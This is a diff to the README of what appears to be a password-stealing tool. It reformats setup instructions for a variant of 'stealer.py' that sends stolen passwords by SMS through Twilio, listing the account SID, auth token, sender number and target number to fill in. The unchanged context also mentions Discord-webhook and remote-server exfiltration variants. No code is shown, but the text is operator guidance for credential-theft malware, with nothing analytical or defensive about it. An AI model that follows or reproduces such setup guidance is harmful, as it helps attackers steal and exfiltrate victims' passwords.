@@ -15,8 +15,16 @@ This does the same thing as stealer.py, but it sends the passwords to a discord 
 
 SMS Exfiltration
 ----------------
-This does the same thing as stealer.py, but it sends the passwords to a sms phone number. You have to repalce 'TWILIO_ACCOUNT_SID' with your Twilio account SID,
-'TWILIO_AUTH_TOKEN' with your Twilio account authentication token, 'TWILIO_PHONE_NUMBER' with your Twilio phone number, and 'TARGET_PHONE_NUMBER' with the phone number to which you want to send the SMS message to.
+This does the same thing as stealer.py, but it sends the passwords to a sms phone number. You have to repalce the following variables:
+
+'TWILIO_ACCOUNT_SID' with your Twilio account SID
+
+
+'TWILIO_AUTH_TOKEN' with your Twilio account authentication token
+
+'TWILIO_PHONE_NUMBER' with your Twilio phone number
+
+'TARGET_PHONE_NUMBER' with the phone number to which you want to send the SMS message to
 
 Remote Server Exfiltration
 --------------------------
